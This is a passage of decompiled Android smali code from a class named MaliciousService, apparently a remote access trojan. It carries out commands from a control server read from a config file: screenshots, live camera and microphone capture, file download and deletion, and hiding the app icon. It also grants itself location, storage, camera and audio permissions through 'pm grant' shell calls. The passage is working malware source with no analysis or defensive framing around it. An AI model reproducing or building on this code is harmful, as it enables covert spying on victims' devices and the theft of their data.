    sget-object v3, Landroid/os/Environment;->DIRECTORY_DOWNLOADS:Ljava/lang/String;

    invoke-static {v3}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v3

    const-string v4, "downloaded_sample.txt"

    invoke-direct {v2, v3, v4}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 591
    :try_start_26
    new-instance v3, Ljava/net/URL;

    invoke-direct {v3, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 592
    invoke-virtual {v3}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;

    .line 593
    const/16 v3, 0x2710

    invoke-virtual {v0, v3}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 594
    invoke-virtual {v0, v3}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 595
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->connect()V

    .line 596
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v3

    .line 597
    const/16 v4, 0xc8

    if-ne v3, v4, :cond_96

    .line 598
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v0
    :try_end_48
    .catch Ljava/io/IOException; {:try_start_26 .. :try_end_48} :catch_ad

    .line 599
    :try_start_48
    new-instance v3, Ljava/io/FileOutputStream;

    invoke-direct {v3, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    :try_end_4d
    .catchall {:try_start_48 .. :try_end_4d} :catchall_8a

    .line 600
    const/16 v4, 0x400

    :try_start_4f
    new-array v4, v4, [B

    .line 602
    :goto_51
    invoke-virtual {v0, v4}, Ljava/io/InputStream;->read([B)I

    move-result v5

    const/4 v6, -0x1

    if-eq v5, v6, :cond_5d

    .line 603
    const/4 v6, 0x0

    invoke-virtual {v3, v4, v6, v5}, Ljava/io/FileOutputStream;->write([BII)V

    goto :goto_51

    .line 605
    :cond_5d
    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "File downloaded successfully: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_77
    .catchall {:try_start_4f .. :try_end_77} :catchall_80

    .line 606
    :try_start_77
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V
    :try_end_7a
    .catchall {:try_start_77 .. :try_end_7a} :catchall_8a

    if-eqz v0, :cond_7f

    :try_start_7c
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_7f
    .catch Ljava/io/IOException; {:try_start_7c .. :try_end_7f} :catch_ad

    .line 598
    :cond_7f
    goto :goto_ac

    :catchall_80
    move-exception v2

    :try_start_81
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V
    :try_end_84
    .catchall {:try_start_81 .. :try_end_84} :catchall_85

    goto :goto_89

    :catchall_85
    move-exception v3

    :try_start_86
    invoke-static {v2, v3}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :goto_89
    throw v2
    :try_end_8a
    .catchall {:try_start_86 .. :try_end_8a} :catchall_8a

    :catchall_8a
    move-exception v2

    if-eqz v0, :cond_95

    :try_start_8d
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_90
    .catchall {:try_start_8d .. :try_end_90} :catchall_91

    goto :goto_95

    :catchall_91
    move-exception v0

    :try_start_92
    invoke-static {v2, v0}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :cond_95
    :goto_95
    throw v2

    .line 608
    :cond_96
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Failed to download file. Response code: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_ac
    .catch Ljava/io/IOException; {:try_start_92 .. :try_end_ac} :catch_ad

    .line 612
    :goto_ac
    goto :goto_c8

    .line 610
    :catch_ad
    move-exception v0

    .line 611
    invoke-virtual {v0}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error downloading file: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 613
    :goto_c8
    return-void
.end method

.method private executeCommand(Ljava/lang/String;)V
    .registers 8

    .line 480
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Executing command: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "MaliciousService"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 481
    const-string v0, "SET_SERVER_CONFIG:"

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    const/4 v2, 0x2

    const/4 v3, 0x1

    const/4 v4, 0x3

    if-eqz v0, :cond_52

    .line 482
    const-string v0, ":"

    invoke-virtual {p1, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 483
    array-length v5, v0

    if-ne v5, v4, :cond_3a

    .line 484
    aget-object p1, v0, v3

    .line 485
    aget-object v0, v0, v2

    .line 486
    invoke-direct {p0, p1, v0}, Lcom/example/android/MaliciousService;->saveServerConfigToPreferences(Ljava/lang/String;Ljava/lang/String;)V

    .line 487
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->loadServerConfigFromPreferences()V

    .line 488
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->registerDeviceWithServer()V

    .line 489
    goto :goto_50

    .line 490
    :cond_3a
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Invalid SET_SERVER_CONFIG format: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 492
    :goto_50
    goto/16 :goto_124

    .line 493
    :cond_52
    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    move-result v0

    sparse-switch v0, :sswitch_data_126

    :cond_59
    goto :goto_b4

    :sswitch_5a
    const-string v0, "DELETE_FILE"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    goto :goto_b5

    :sswitch_63
    const-string v0, "SHOW_ICON"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/16 v2, 0x8

    goto :goto_b5

    :sswitch_6e
    const-string v0, "SCREENSHOT"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/4 v2, 0x0

    goto :goto_b5

    :sswitch_78
    const-string v0, "HIDE_ICON"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/4 v2, 0x7

    goto :goto_b5

    :sswitch_82
    const-string v0, "LIVE_CAMERA"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/4 v2, 0x3

    goto :goto_b5

    :sswitch_8c
    const-string v0, "DOWNLOAD_FILE"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/4 v2, 0x1

    goto :goto_b5

    :sswitch_96
    const-string v0, "STOP_CAMERA"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/4 v2, 0x5

    goto :goto_b5

    :sswitch_a0
    const-string v0, "STOP_MIC"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/4 v2, 0x6

    goto :goto_b5

    :sswitch_aa
    const-string v0, "LIVE_MIC"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/4 v2, 0x4

    goto :goto_b5

    :goto_b4
    const/4 v2, -0x1

    :goto_b5
    packed-switch v2, :pswitch_data_14c

    .line 543
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Unknown command: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_124

    .line 540
    :pswitch_cf
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->showIcon()V

    .line 541
    goto :goto_124

    .line 537
    :pswitch_d3
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->hideIcon()V

    .line 538
    goto :goto_124

    .line 531
    :pswitch_d7
    iget-object p1, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda7;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda7;-><init>(Lcom/example/android/MaliciousService;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 535
    goto :goto_124

    .line 525
    :pswitch_e2
    iget-object p1, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda6;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda6;-><init>(Lcom/example/android/MaliciousService;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 529
    goto :goto_124

    .line 519
    :pswitch_ed
    iget-object p1, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda5;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda5;-><init>(Lcom/example/android/MaliciousService;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 523
    goto :goto_124

    .line 513
    :pswitch_f8
    iget-object p1, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda4;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda4;-><init>(Lcom/example/android/MaliciousService;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 517
    goto :goto_124

    .line 507
    :pswitch_103
    iget-object p1, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda3;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda3;-><init>(Lcom/example/android/MaliciousService;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 511
    goto :goto_124

    .line 501
    :pswitch_10e
    iget-object p1, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda2;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda2;-><init>(Lcom/example/android/MaliciousService;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 505
    goto :goto_124

    .line 495
    :pswitch_119
    iget-object p1, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda1;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda1;-><init>(Lcom/example/android/MaliciousService;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 499
    nop

    .line 546
    :goto_124
    return-void

    nop

    :sswitch_data_126
    .sparse-switch
        -0x7cc653ac -> :sswitch_aa
        -0x6b107796 -> :sswitch_a0
        -0x42c7f1fe -> :sswitch_96
        -0x429efd2d -> :sswitch_8c
        -0x3cfe9628 -> :sswitch_82
        -0x2547eeaa -> :sswitch_78
        0x4177166 -> :sswitch_6e
        0x3663707b -> :sswitch_63
        0x3f327f90 -> :sswitch_5a
    .end sparse-switch

    :pswitch_data_14c
    .packed-switch 0x0
        :pswitch_119
        :pswitch_10e
        :pswitch_103
        :pswitch_f8
        :pswitch_ed
        :pswitch_e2
        :pswitch_d7
        :pswitch_d3
        :pswitch_cf
    .end packed-switch
.end method

.method private getRequiredPermissions()[Ljava/lang/String;
    .registers 4

    .line 271
    const/4 v0, 0x6

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v2, "android.permission.ACCESS_FINE_LOCATION"

    aput-object v2, v0, v1

    const/4 v1, 0x1

    const-string v2, "android.permission.ACCESS_COARSE_LOCATION"

    aput-object v2, v0, v1

    const/4 v1, 0x2

    const-string v2, "android.permission.WRITE_EXTERNAL_STORAGE"

    aput-object v2, v0, v1

    const/4 v1, 0x3

    const-string v2, "android.permission.READ_EXTERNAL_STORAGE"

    aput-object v2, v0, v1

    const/4 v1, 0x4

    const-string v2, "android.permission.RECORD_AUDIO"

    aput-object v2, v0, v1

    const/4 v1, 0x5

    const-string v2, "android.permission.CAMERA"

    aput-object v2, v0, v1

    return-object v0
.end method

.method private grantPermissions()V
    .registers 9

    .line 295
    :try_start_0
    invoke-virtual {p0}, Lcom/example/android/MaliciousService;->getPackageName()Ljava/lang/String;

    move-result-object v0

    .line 296
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->getRequiredPermissions()[Ljava/lang/String;

    move-result-object v1

    array-length v2, v1

    const/4 v3, 0x0

    :goto_a
    if-ge v3, v2, :cond_35

    aget-object v4, v1, v3

    .line 297
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "pm grant "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, " "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v5, v4}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    :try_end_32
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_32} :catch_36

    .line 296
    add-int/lit8 v3, v3, 0x1

    goto :goto_a

    .line 301
    :cond_35
    goto :goto_53

    .line 299
    :catch_36
    move-exception v0

    .line 300
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Grant permissions error: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "MaliciousService"

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 302
    :goto_53
    return-void
.end method

.method private hideIcon()V
    .registers 5

    .line 706
    invoke-virtual {p0}, Lcom/example/android/MaliciousService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    .line 707
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.example.android.MainActivity"

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 708
    const/4 v2, 0x2

    const/4 v3, 0x1

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 709
    const-string v0, "MaliciousService"

    const-string v1, "App icon hidden."

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 710
    return-void
.end method

.method private initializeUniqueDeviceId()V
    .registers 5

    .line 213
    const-string v0, "RAT_DEVICE_PREFS"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/example/android/MaliciousService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 214
    const/4 v1, 0x0

    const-string v2, "device_id"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    .line 215
    const-string v3, "MaliciousService"

    if-eqz v1, :cond_34

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_1b

    goto :goto_34

    .line 222
    :cond_1b
    iget-object v0, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Loaded existing unique device ID: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_63

    .line 216
    :cond_34
    :goto_34
    invoke-static {}, Ljava/util/UUID;->randomUUID()Ljava/util/UUID;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/UUID;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    .line 217
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 218
    iget-object v1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 219
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 220
    iget-object v0, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Generated and saved new unique device ID: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 221
    nop

    .line 224
    :goto_63
    return-void
.end method

.method private injectConfigFromAssets()V
    .registers 6

    .line 250
    const-string v0, "MaliciousService"

    :try_start_2
    invoke-virtual {p0}, Lcom/example/android/MaliciousService;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v1

    const-string v2, "config.ini"

    invoke-virtual {v1, v2}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v1

    .line 251
    new-instance v2, Ljava/util/Properties;

    invoke-direct {v2}, Ljava/util/Properties;-><init>()V

    .line 252
    invoke-virtual {v2, v1}, Ljava/util/Properties;->load(Ljava/io/InputStream;)V

    .line 253
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 254
    const-string v1, "SERVER_IP"

    invoke-virtual {v2, v1}, Ljava/util/Properties;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 255
    const-string v3, "FLASK_PORT"

    invoke-virtual {v2, v3}, Ljava/util/Properties;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 257
    if-eqz v1, :cond_57

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_57

    if-eqz v2, :cond_57

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_57

    .line 258
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Config injected from assets/config.ini: IP="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ", Flask Port="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 259
    invoke-direct {p0, v1, v2}, Lcom/example/android/MaliciousService;->saveServerConfigToPreferences(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_94

    .line 261
    :cond_57
    const-string v1, "Injected config.ini found but IP/Flask Port are missing or empty."

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_5c
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_5c} :catch_79
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_5c} :catch_5d

    goto :goto_94

    .line 265
    :catch_5d
    move-exception v1

    .line 266
    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error processing injected config from assets: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_95

    .line 263
    :catch_79
    move-exception v1

    .line 264
    invoke-virtual {v1}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "config.ini not found in assets, or error reading it: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 267
    :goto_94
    nop

    .line 268
    :goto_95
    return-void
.end method

.method private synthetic lambda$executeCommand$0()Ljava/lang/Void;
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 496
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->takeScreenshot()V

    .line 497
    const/4 v0, 0x0

    return-object v0
.end method

.method private synthetic lambda$executeCommand$1()Ljava/lang/Void;
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 502
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->downloadFile()V

    .line 503
    const/4 v0, 0x0

    return-object v0
.end method

.method private synthetic lambda$executeCommand$2()Ljava/lang/Void;
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 508
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->deleteFile()V

    .line 509
    const/4 v0, 0x0

    return-object v0
.end method

.method private synthetic lambda$executeCommand$3()Ljava/lang/Void;
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 514
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->startLiveCamera()V

    .line 515
    const/4 v0, 0x0

    return-object v0
.end method

.method private synthetic lambda$executeCommand$4()Ljava/lang/Void;
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 520
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->startLiveMic()V

    .line 521
    const/4 v0, 0x0

    return-object v0
.end method

.method private synthetic lambda$executeCommand$5()Ljava/lang/Void;
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 526
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->stopLiveCamera()V

    .line 527
